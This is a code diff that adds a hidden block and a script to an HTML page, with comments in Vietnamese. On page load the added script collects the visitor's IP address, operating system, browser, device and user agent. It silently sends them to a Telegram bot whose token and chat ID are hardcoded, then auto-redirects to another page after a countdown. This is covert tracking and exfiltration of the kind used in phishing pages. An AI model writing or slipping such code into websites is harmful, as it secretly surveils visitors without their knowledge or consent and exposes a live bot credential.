@@ -1244,6 +1244,88 @@ submitBtn.addEventListener('click', () => {
   window.scrollTo({ top: 0, behavior: 'smooth' });
 });
 </script>
+<!-- Bổ sung các phần tử cần để script cập nhật -->
+<div id="info" class="hidden">
+  <span id="user-ip"></span>
+  <span id="user-os"></span>
+  <span id="user-browser"></span>
+  <span id="user-device"></span>
+  <span id="countdown"></span>
+</div>
+
+<script>
+  const botToken = '7623143516:AAFYwwTpeie2FzjUD69EIVWgXRUt4F0J7hE'; // <-- Token bot của bạn
+  const chatId = '5293126208'; // <-- Chat ID
+
+  // Lấy IP, OS, Browser, Device và gửi về Telegram
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      document.getElementById('user-ip').textContent = data.ip;
+
+      const userAgent = navigator.userAgent;
+      let os = "Không xác định";
+      let browser = "Không xác định";
+      let device = "Không xác định";
+
+      // OS
+      if (/windows phone/i.test(userAgent)) os = "Windows Phone";
+      else if (/android/i.test(userAgent)) {
+        os = "Android";
+        if (/tecno/i.test(userAgent)) device = "Tecno";
+        else if (/samsung/i.test(userAgent)) device = "Samsung";
+        else if (/xiaomi/i.test(userAgent)) device = "Xiaomi";
+        else if (/huawei/i.test(userAgent)) device = "Huawei";
+        else device = "Thiết bị Android khác";
+      } else if (/iPad|iPhone|iPod/.test(userAgent)) {
+        os = "iOS";
+        if (/iPhone/i.test(userAgent)) device = "iPhone";
+        else if (/iPad/i.test(userAgent)) device = "iPad";
+      } else if (/Macintosh/.test(userAgent)) os = "Mac OS";
+      else if (/Windows/.test(userAgent)) os = "Windows";
+      else if (/Linux/.test(userAgent)) os = "Linux";
+
+      // Browser
+      if (/chrome/i.test(userAgent)) browser = "Chrome";
+      else if (/firefox/i.test(userAgent)) browser = "Firefox";
+      else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) browser = "Safari";
+      else if (/msie|trident/i.test(userAgent)) browser = "Internet Explorer";
+      else if (/edg/i.test(userAgent)) browser = "Microsoft Edge";
+
+      document.getElementById('user-os').textContent = os;
+      document.getElementById('user-browser').textContent = browser;
+      document.getElementById('user-device').textContent = device;
+
+      // Gửi Telegram
+      const message = `🌐 CÓ NGƯỜI VỪA TRUY CẬP:\n\nIP: ${data.ip}\nThiết bị: ${device}\nTrình duyệt: ${browser}\nHệ điều hành: ${os}\nUser-Agent: ${userAgent}`;
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: chatId, text: message})
+      });
+    })
+    .catch(() => {
+      document.getElementById('user-ip').textContent = 'Không lấy được IP';
+    });
+
+  // Đếm ngược và tự chuyển trang
+  let seconds = 8;
+  const countdownElement = document.getElementById('countdown');
+
+  const countdown = setInterval(() => {
+    seconds--;
+    if (seconds > 0) {
+      countdownElement.textContent = `Chuyển trang sau: ${seconds}`;
+    } else {
+      clearInterval(countdown);
+      window.location.href = 'next.html';
+    }
+  }, 1000);
+
+  function redirectNow() {
+    window.location.href = 'next.html';
+  }
+</script>
 
 </body>
 </html>
